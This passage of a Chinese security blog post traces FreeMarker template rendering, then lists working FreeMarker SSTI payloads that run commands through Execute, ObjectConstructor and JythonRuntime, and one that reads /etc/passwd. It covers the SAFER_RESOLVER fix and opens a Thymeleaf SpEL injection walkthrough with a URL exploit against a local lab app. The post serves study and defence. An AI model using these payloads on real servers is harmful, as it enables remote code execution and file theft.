+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753772904081-8ba615c8-b5eb-44ca-b135-8446a5d966e7.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753772904081-8ba615c8-b5eb-44ca-b135-8446a5d966e7.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753772927751-0624ffd6-c5b0-4846-89f3-93354b2390d2.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753772927751-0624ffd6-c5b0-4846-89f3-93354b2390d2.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
+<p>跟进到最后<code>buildView</code>方法中，先看一下<code>this.instantiateView</code>方法，该方法new了一个<code>FreeMarkerView</code>类，然后进行了一些基础的赋值，将View Build了出来</p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753772981263-3d637877-a197-4a7e-86ee-91bd2b2d3dc3.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753772981263-3d637877-a197-4a7e-86ee-91bd2b2d3dc3.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753773028357-67369d8b-d688-4d05-9d13-93a2553ea79d.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753773028357-67369d8b-d688-4d05-9d13-93a2553ea79d.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
+<p>回到<code>loadView</code>方法，<code>loadView</code>方法调用了<code>view.checkResource</code>方法</p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753773172688-b45f852b-1385-47f3-8fd2-e537910ed578.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753773172688-b45f852b-1385-47f3-8fd2-e537910ed578.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
+<p>跟进<code>view.checkResource</code>，在这个方法中做了两件事情：</p>
+<ol>
+<li>获取URL，判断URL是否为空</li>
+<li>获取Template，准备开始模板引擎的渲染</li>
+</ol>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753773228124-5f413a34-a761-40bf-9ff4-4d98da44dd4a.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753773228124-5f413a34-a761-40bf-9ff4-4d98da44dd4a.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
+<p>获取URL没什么好说的，返回的url为<code>index.ftl</code>，层层跟进<code>this.getTemplate</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753773497264-5e0b265c-1f63-4aa1-83f3-d6d48f257c0b.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753773497264-5e0b265c-1f63-4aa1-83f3-d6d48f257c0b.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
+<p>首先做了一些参数的判断，然后调用<code>this.cache.getTemplate</code>，从cache中获取template（在设置模板时，会将其存储到cache中）</p>
+<p>继续跟进<code>this.getTemplateInternal</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753773646327-a14eebd5-15c2-4c6c-8c1f-6eece1b41326.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753773646327-a14eebd5-15c2-4c6c-8c1f-6eece1b41326.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
+<p>前面做了一些判断，跟进<code>lookupTemplate</code>方法中，再跟进<code>this.templateLookupStrategy.lookup</code>，以及<code>lookupWithLocalizedThenAcquisitionStrategy</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753773788601-3b4dc30e-f1a2-40f7-a229-e3bc6a39cade.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753773788601-3b4dc30e-f1a2-40f7-a229-e3bc6a39cade.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
+<p>在<code>lookupWithLocalizedThenAcquisitionStrategy</code>中，就是真正寻找文件的地方了</p>
+<p>while之前，将文件名以<code>.</code>为截断截取文件名和文件后缀</p>
+<p>将locale拼接到文件名后，在与后缀拼接<code>index_zh_CN.ftl</code>，每次以最后一个<code>_</code>为截断进行截取，寻找模板，顺序为<code>index_zh_CN.ftl</code>，<code>index_zh.ftl</code>，<code>index.ftl</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753774011353-44b58dac-06d8-4d33-b0c9-598b865cbdf6.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753774011353-44b58dac-06d8-4d33-b0c9-598b865cbdf6.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
+<p><code>this.lookupWithAcquisitionStrategy</code>的主要任务是，判断是否存在这个模板并获取模板</p>
+<p>跟进</p>
+<p><code>this.lookupWithAcquisitionStrategy</code>，再跟进<code>lookupTemplateWithAcquisitionStrategy</code>，有一个<code>this.findTemplateSource(path)</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753774493266-1d8853da-73d9-45a4-8522-f0f2f6d0fab0.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753774493266-1d8853da-73d9-45a4-8522-f0f2f6d0fab0.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
+<p>层层跟进后，会将文件名和我们设置的模板目录进行拼接，并判断文件是否存在</p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753774581923-4244b14f-3ad5-4279-8322-1b4c4168eb85.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753774581923-4244b14f-3ad5-4279-8322-1b4c4168eb85.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
+<p>最后回到<code>getTemplate</code>方法中，这里<code>maybeTemp.getTemplate</code>方法，就从资源中获取到到了我们的模板内容</p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753774897991-135eb53d-8eb5-489b-93a3-2bf9d0823775.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753774897991-135eb53d-8eb5-489b-93a3-2bf9d0823775.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
+<p>接下来我们一步一步步出到<code>processHandlerException#render</code>方法中，走到<code>view.render</code>处，这里mv参数就可以看到我们所设置的参数</p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753775479406-e9f9af81-294c-4bfe-a90a-59930d93eb3e.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753775479406-e9f9af81-294c-4bfe-a90a-59930d93eb3e.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
+<p>层层跟进到<code>FreeMarkerView#doRender</code>方法内</p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753775740561-cb2eeeea-fa31-4ae6-9b1a-982b508933e0.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753775740561-cb2eeeea-fa31-4ae6-9b1a-982b508933e0.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
+<p>然后跟进<code>this.processTemplate</code>，继续层层跟入<code>template.process</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753775824428-f52bbadb-4b5f-43c2-8c24-caf133f5b61f.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753775824428-f52bbadb-4b5f-43c2-8c24-caf133f5b61f.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
+<p><code>prcess</code>方法 是做了一个输出HTML文件或其他文件的工作，相当于渲染的最后一步。在该方法中，会对ftl的文件进行遍历，读取一些信息</p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753776026592-5dac9d93-eb5c-4ec5-a50e-96c04bf7d6ba.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753776026592-5dac9d93-eb5c-4ec5-a50e-96c04bf7d6ba.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
+<p>在读取到每一条 freeMarker 表达式语句或插值的时候，会二次调用 <code>visit</code> 方法，而 <code>visit</code> 方法又调用了 <code>element.accept</code>，跟进</p>
+<p>在读取到<code>$&#123;user.id&#125;</code>时，在accept方法中就可以获取到其对应的值了</p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753776491797-b1474b61-66d8-4d6c-bc4f-8994b6f4c856.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753776491797-b1474b61-66d8-4d6c-bc4f-8994b6f4c856.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
+<p>在读取到<code>&lt;#assign value=&quot;freemarker.template.utility.Execute&quot;?new()&gt;</code>时，<code>accept</code>是这样的。</p>
+<p>首先进行一系列的判断，判断<code>namespaceExp</code>是否为null，接着判断<code>this.operatorType</code>是否等于65536，后面我们跟进<code>eval</code>方法，在跟进<code>_eval</code>方法</p>
+<p>在最后的<code>_eval</code>方法中，可以看到最后构造了一个<code>Execute</code>方法并返回</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/44744277/1753777188629-a060b965-a3b4-448c-b6e2-e97a0e5a821a.png" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2025/png/44744277/1753777188629-a060b965-a3b4-448c-b6e2-e97a0e5a821a.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753776739468-6759a50a-8038-48cd-8469-3cd869981cb8.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753776739468-6759a50a-8038-48cd-8469-3cd869981cb8.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753778035470-4844fe57-0e3f-466e-aea2-b1a35cce7cb1.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753778035470-4844fe57-0e3f-466e-aea2-b1a35cce7cb1.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
+<p>将构造好的<code>Execute</code>方法，与我们的参数<code>value</code>，一起put进去了<code>namespace</code>中</p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753778205632-2765a2ed-dd0f-462f-86b9-35662810943b.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753778205632-2765a2ed-dd0f-462f-86b9-35662810943b.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
+<p>在读取到<code>$&#123;value(&quot;Calc&quot;)&#125;</code>中，根据以下调用栈进行跟进</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">accept -&gt; calculateInterpolatedStringOrMarkup -&gt; eval -&gt; _eval</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753778329137-5c807f0d-d1fe-45c4-98b9-b36769347b1b.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753778329137-5c807f0d-d1fe-45c4-98b9-b36769347b1b.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
+<p>最后走到<code>_eval</code>中，获取到之前添加进namespace中的<code>value: Execute@9528</code>，拿到了<code>Execute</code>方法，最后调用<code>Execute(&quot;Calc&quot;)</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753778565581-61202614-6e16-4606-99a4-3624ae31840a.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753778565581-61202614-6e16-4606-99a4-3624ae31840a.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
+<p>最后走到<code>Execute#exec</code>中进行命令执行</p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753778769973-45e4941f-7813-42be-8716-229d3eaacfb5.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753778769973-45e4941f-7813-42be-8716-229d3eaacfb5.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
+<h4 id="pnsts">FreeMarker SSTI Bypass</h4>
+
+<p>目前的Poc是这样的，前面除了new，还简单说了一下api方法</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;#assign value=<span class="string">&quot;freemarker.template.utility.Execute&quot;</span>?<span class="keyword">new</span>()&gt;$&#123;value(<span class="string">&quot;Calc&quot;</span>)&#125;</span><br></pre></td></tr></table></figure>
+
+<p>根据这些，我们可以构造出一些其他的poc进行bypass操作</p>
+<h5 id="S2PeB">Poc1</h5>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;#assign classLoader=object?api.class.protectionDomain.classLoader&gt; </span><br><span class="line">&lt;#assign clazz=classLoader.loadClass(<span class="string">&quot;ClassExposingGSON&quot;</span>)&gt; </span><br><span class="line">&lt;#assign field=clazz?api.getField(<span class="string">&quot;GSON&quot;</span>)&gt; </span><br><span class="line">&lt;#assign gson=field?api.get(<span class="literal">null</span>)&gt; </span><br><span class="line">&lt;#assign ex=gson?api.fromJson(<span class="string">&quot;&#123;&#125;&quot;</span>, classLoader.loadClass(<span class="string">&quot;freemarker.template.utility.Execute&quot;</span>))&gt; </span><br><span class="line">$&#123;ex(<span class="string">&quot;Calc&quot;</span><span class="string">&quot;)&#125;</span></span><br></pre></td></tr></table></figure>
+
+<h5 id="DR4vo">Poc2</h5>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;#assign value=<span class="string">&quot;freemarker.template.utility.ObjectConstructor&quot;</span>?<span class="keyword">new</span>()&gt;$&#123;value(<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>,<span class="string">&quot;Calc&quot;</span>).start()&#125;</span><br></pre></td></tr></table></figure>
+
+<h5 id="Tc6Sc">Poc3</h5>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;#assign value=<span class="string">&quot;freemarker.template.utility.JythonRuntime&quot;</span>?<span class="keyword">new</span>()&gt;&lt;<span class="meta">@value</span>&gt;<span class="keyword">import</span> os;os.system(<span class="string">&quot;calc&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<h5 id="eSMeQ">Poc4</h5>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;#assign ex=<span class="string">&quot;freemarker.template.utility.Execute&quot;</span>?<span class="keyword">new</span>()&gt; $&#123; ex(<span class="string">&quot;Calc&quot;</span>) &#125;</span><br></pre></td></tr></table></figure>
+
+<h5 id="w8Dbx">Poc5(文件读取)</h5>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;#assign is=object?api.class.getResourceAsStream(<span class="string">&quot;/Test.class&quot;</span>)&gt;</span><br><span class="line">FILE:[&lt;#list <span class="number">0.</span><span class="number">.999999999</span> as _&gt;</span><br><span class="line">    &lt;#assign <span class="type">byte</span>=is.read()&gt;</span><br><span class="line">    &lt;#<span class="keyword">if</span> <span class="type">byte</span> == -<span class="number">1</span>&gt;</span><br><span class="line">        &lt;#<span class="keyword">break</span>&gt;</span><br><span class="line">    &lt;/#<span class="keyword">if</span>&gt;</span><br><span class="line">$&#123;<span class="type">byte</span>&#125;, &lt;/#list&gt;]</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;#assign uri=object?api.class.getResource(<span class="string">&quot;/&quot;</span>).toURI()&gt;</span><br><span class="line">&lt;#assign input=uri?api.create(<span class="string">&quot;file:///etc/passwd&quot;</span>).toURL().openConnection()&gt;</span><br><span class="line">&lt;#assign is=input?api.getInputStream()&gt;</span><br><span class="line">FILE:[&lt;#list <span class="number">0.</span><span class="number">.999999999</span> as _&gt;</span><br><span class="line">    &lt;#assign <span class="type">byte</span>=is.read()&gt;</span><br><span class="line">    &lt;#<span class="keyword">if</span> <span class="type">byte</span> == -<span class="number">1</span>&gt;</span><br><span class="line">        &lt;#<span class="keyword">break</span>&gt;</span><br><span class="line">    &lt;/#<span class="keyword">if</span>&gt;</span><br><span class="line">$&#123;<span class="type">byte</span>&#125;, &lt;/#list&gt;]</span><br></pre></td></tr></table></figure>
+
+<h4 id="BCRk6">FreeMarker SSTI修复</h4>
+
+<p>从 2.3.17版本以后，官方版本提供了三种TemplateClassResolver对类进行解析：</p>
+<ol>
+<li>UNRESTRICTED_RESOLVER：可以通过 ClassUtil.forName(className) 获取任何类。</li>
+<li>SAFER_RESOLVER：不能加载 freemarker.template.utility.JythonRuntime、freemarker.template.utility.Execute、freemarker.template.utility.ObjectConstructor这三个类。</li>
+<li>ALLOWS_NOTHING_RESOLVER：不能解析任何类。</li>
+</ol>
+<p>可通过<code>freemarker.core.Configurable#setNewBuiltinClassResolver</code>方法设置TemplateClassResolver，从而限制通过new()函数对<code>freemarker.template.utility.JythonRuntime</code>、<code>freemarker.template.utility.Execute</code>、<code>freemarker.template.utility.ObjectConstructor</code>这三个类的解析。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> freemarker;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> freemarker.cache.StringTemplateLoader;</span><br><span class="line"><span class="keyword">import</span> freemarker.core.TemplateClassResolver;</span><br><span class="line"><span class="keyword">import</span> freemarker.template.Configuration;</span><br><span class="line"><span class="keyword">import</span> freemarker.template.Template;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.OutputStreamWriter;</span><br><span class="line"><span class="keyword">import</span> java.io.StringWriter;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">freemarker_ssti</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//设置模板</span></span><br><span class="line">        HashMap&lt;String, String&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;String, String&gt;();</span><br><span class="line">        <span class="type">String</span> <span class="variable">poc</span> <span class="operator">=</span><span class="string">&quot;&lt;#assign value=\&quot;freemarker.template.utility.Execute\&quot;?new()&gt; $&#123; value(\&quot;Calc\&quot;) &#125;&quot;</span>;</span><br><span class="line">        System.out.println(poc);</span><br><span class="line">        <span class="type">StringTemplateLoader</span> <span class="variable">stringLoader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringTemplateLoader</span>();</span><br><span class="line">        <span class="type">Configuration</span> <span class="variable">cfg</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Configuration</span>();</span><br><span class="line">        stringLoader.putTemplate(<span class="string">&quot;name&quot;</span>,poc);</span><br><span class="line">        cfg.setTemplateLoader(stringLoader);</span><br><span class="line">        <span class="comment">//cfg.setNewBuiltinClassResolver(TemplateClassResolver.SAFER_RESOLVER);</span></span><br><span class="line">        <span class="comment">//处理解析模板</span></span><br><span class="line">        <span class="type">Template</span> <span class="variable">Template_name</span> <span class="operator">=</span> cfg.getTemplate(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">        <span class="type">StringWriter</span> <span class="variable">stringWriter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringWriter</span>();</span><br><span class="line"></span><br><span class="line">        Template_name.process(Template_name,stringWriter);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="nAcgD">Thymeleaf</h3>
+
+<p>Thymeleaf 是一种用于 Web 和独立环境中的现代化服务器端 Java 模板引擎，它能够处理 HTML， XML，JavaScript，CSS 甚至纯文本。Thymeleaf 使用自然模板语法和预处理引擎，使得模板易于阅读， 修改和维护。Thymeleaf 是可扩展的，可以添加自定义标签和扩展函数，以实现自己的需求。</p>
+<h4 id="jU0m6">Thymeleaf基础</h4>
+
+<h5 id="UXyM6">Thymeleaf语法基础</h5>
+
+<p>Thymeleaf表达式有以下类型</p>
+<ul>
+<li><code>$&#123;&#125;</code>：变量表达式——通常在实际应用中，一般是OGNL表达式或者SpEL表达式，如果集成了Spring，可以在上下文变量中执行</li>
+<li><code>*&#123;&#125;</code>：选择表达式——类似于变量表达式，区别在于选择表达式是在当前选择的对象而不是整个上下文变量映射上执行</li>
+<li><code>#&#123;&#125;</code>：Message（i18n）表达式——允许从外部源（例如<code>.properties</code>文件检索特定于语言环境的消息）</li>
+<li><code>@&#123;&#125;</code>：链接表达式——一般用在应用程序中设置正确的URL路径（URL重写）</li>
+<li><code>~&#123;&#125;</code>：片段表达式——Thymeleaf 3.X 版本新增的内容，片段表达式是一种表示标记片段并将其移动到模板周围的简单方法。正式由于这些表达式，片段可以被赋值，或者作为参数传递给其他模板等等</li>
+</ul>
+<h5 id="klKXS">表达式预处理</h5>
+
+<p>除了上述用于表达式处理的功能外，Thymeleaf还具有预处理表达式的能力。预处理是在处理正常表达式前完成的表达式的执行，允许修改最终将执行的表达式</p>
+<p>预处理的表达式与普通表达式完全一样，但是被双下划线符号包围，例子如下：</p>
+<p>首先变量表达式<code>$&#123;sel.code&#125;</code>先被执行，如果结果为<code>ALL</code>，那么<code>__</code>之间的值<code>ALL</code>将被当作表达式的一部分被执行，这里会变为<code>#&#123;selection.ALL&#125;</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#&#123;selection.__$&#123;sel.code&#125;__&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="ptZM2">Thymeleaf SSTI</h4>
+Thymeleaf出现SSTI问题的主要原因是因为片段表达式，其本质为SPEL表达式注入。实际只有3.X版本的Thymeleaf才会收到影响，因为在2.X中`readerFragment`的核心处理方法为：
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">renderFragment</span><span class="params">(Set&lt;String&gt; markupSelectorsToRender, Map&lt;String, ?&gt; model, HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="type">Configuration</span> <span class="variable">configuration</span> <span class="operator">=</span> viewTemplateEngine.getConfiguration();</span><br><span class="line">    <span class="type">ProcessingContext</span> <span class="variable">processingContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ProcessingContext</span>(context);</span><br><span class="line">    templateCharacterEncoding = getStandardDialectPrefix(configuration);</span><br><span class="line">    <span class="type">StandardFragment</span> <span class="variable">fragment</span> <span class="operator">=</span> StandardFragmentProcessor.computeStandardFragmentSpec(configuration, processingContext, viewTemplateName, templateCharacterEncoding, <span class="string">&quot;fragment&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (fragment == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;Invalid template name specification: &#x27;&quot;</span> + viewTemplateName + <span class="string">&quot;&#x27;&quot;</span>);</span><br><span class="line">    &#125;   </span><br><span class="line">    ...</span><br></pre></td></tr></table></figure>
+
+<p>里面并没有3.X版本中对于片段表达式<code>~&#123;&#125;</code>的处理，因此也不会造成SSTI漏洞</p>
+<p>SpringBoot默认引用thymeleaf版本对应如下：</p>
+<table>
+<thead>
+<tr>
+<th align="center">Spring Boot</th>
+<th align="center">Thymeleaf</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">1.5.1.RELEASE</td>
+<td align="center">2.1.5</td>
+</tr>
+<tr>
+<td align="center">2.0.0.RELEASE</td>
+<td align="center">3.0.9</td>
+</tr>
+<tr>
+<td align="center">2.2.0.RELEASE</td>
+<td align="center">3.0.11</td>
+</tr>
+</tbody></table>
+<h5 id="K5Lmj">环境搭建</h5>
+
+<p>这里的漏洞环境使用这个项目环境：<a target="_blank" rel="noopener" href="https://github.com/veracode-research/spring-view-manipulation/">https://github.com/veracode-research/spring-view-manipulation/</a></p>
+<p>以以下这个路径作为漏洞环境</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;/path&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">path</span><span class="params">(<span class="meta">@RequestParam</span> String lang)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;user/&quot;</span> + lang + <span class="string">&quot;/welcome&quot;</span>; <span class="comment">//template path is tainted</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h5 id="os3QB">漏洞复现</h5>
+
+<p>启动环境后，使用如下poc进行漏洞复现</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:8090/path?lang=__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22Calc%22).getInputStream()).next()%7d__::.x</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753804531798-238de504-bef6-4675-8f73-8eebab679d69.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1753804531798-238de504-bef6-4675-8f73-8eebab679d69.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
+<h5 id="EqNy6">漏洞分析</h5>
+
+<p>对于Thymeleaf中SSTI的分析，主要是分析SpringMVC对于thymeleaf的解析流程</p>
+<p>大致流程参照下图</p>
